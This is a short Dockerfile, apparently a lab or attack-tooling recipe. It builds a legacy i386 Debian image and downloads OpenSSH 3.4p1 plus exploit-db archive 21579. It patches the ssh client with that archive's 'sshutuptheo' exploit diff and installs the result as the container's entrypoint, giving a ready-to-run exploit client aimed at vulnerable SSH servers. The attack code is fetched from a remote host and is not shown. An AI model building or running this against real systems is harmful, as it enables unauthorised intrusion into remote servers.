FROM i386/debian:wheezy

RUN apt-get update && \
    apt-get -y install build-essential libssl-dev zlib1g-dev curl ca-certificates && \
    mkdir x && cd x && \
    curl -o openssh-3.4p1.tar.gz  https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz && \
    curl -o 21579.tar.gz  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/21579.tar.gz  && \
    tar xzvf 21579.tar.gz && \
    tar xzvf openssh-3.4p1.tar.gz && \
    cd openssh-3.4p1 && \
    patch < ../sshutuptheo/ssh.diff  && \
    ./configure && \
    make ssh && \
    cp ssh /usr/bin/ssh && \
    apt-get -y remove build-essential && \
    rm -rf /var/lib/apt/lists/*

ENTRYPOINT ["/usr/bin/ssh"]
